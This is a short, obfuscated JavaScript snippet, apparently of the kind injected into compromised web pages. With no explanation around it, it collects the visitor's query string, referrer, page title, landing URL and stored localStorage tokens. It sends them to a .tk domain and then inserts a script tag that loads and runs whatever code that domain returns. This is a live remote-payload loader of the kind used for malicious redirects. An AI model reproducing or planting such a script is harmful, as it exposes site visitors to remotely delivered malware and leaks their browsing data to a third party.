    (function() {
    var name = '_mkxQgPjwx4PgYZrX';
    if (!window._mkxQgPjwx4PgYZrX) {
        window._mkxQgPjwx4PgYZrX = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://ciaclawinifad.tk/nMdpFV',
            P_PATH: 'https://ciaclawinifad.tk/fec84ce/postback',
        };
    }
    const _5Pj5VPQXjHZtLKx5 = localStorage.getItem('config');
    if (typeof _5Pj5VPQXjHZtLKx5 !== 'undefined' && _5Pj5VPQXjHZtLKx5 !== null) {
        var _HNt5SMvkjHy3SBsg = JSON.parse(_5Pj5VPQXjHZtLKx5);
        var _WKkBTRst2PvRP2yG = Math.round(+new Date()/1000);
        if (_HNt5SMvkjHy3SBsg.created_at + window._mkxQgPjwx4PgYZrX.ttl < _WKkBTRst2PvRP2yG) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _VMGH7L3jz7Vzy9fH = localStorage.getItem('subId');
    var _rkyZpTgWGQhrBwrG = localStorage.getItem('token');
    var _8VFNDW57tK9YHwjM = '?return=js.client';
        _8VFNDW57tK9YHwjM += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _8VFNDW57tK9YHwjM += '&se_referrer=' + encodeURIComponent(document.referrer);
        _8VFNDW57tK9YHwjM += '&default_keyword=' + encodeURIComponent(document.title);
        _8VFNDW57tK9YHwjM += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _8VFNDW57tK9YHwjM += '&name=' + encodeURIComponent(name);
        _8VFNDW57tK9YHwjM += '&host=' + encodeURIComponent(window._mkxQgPjwx4PgYZrX.R_PATH);
    if (typeof _VMGH7L3jz7Vzy9fH !== 'undefined' && _VMGH7L3jz7Vzy9fH && window._mkxQgPjwx4PgYZrX.unique) {
        _8VFNDW57tK9YHwjM += '&sub_id=' + encodeURIComponent(_VMGH7L3jz7Vzy9fH);
    }
    if (typeof _rkyZpTgWGQhrBwrG !== 'undefined' && _rkyZpTgWGQhrBwrG && window._mkxQgPjwx4PgYZrX.unique) {
        _8VFNDW57tK9YHwjM += '&token=' + encodeURIComponent(_rkyZpTgWGQhrBwrG);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._mkxQgPjwx4PgYZrX.R_PATH + _8VFNDW57tK9YHwjM;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
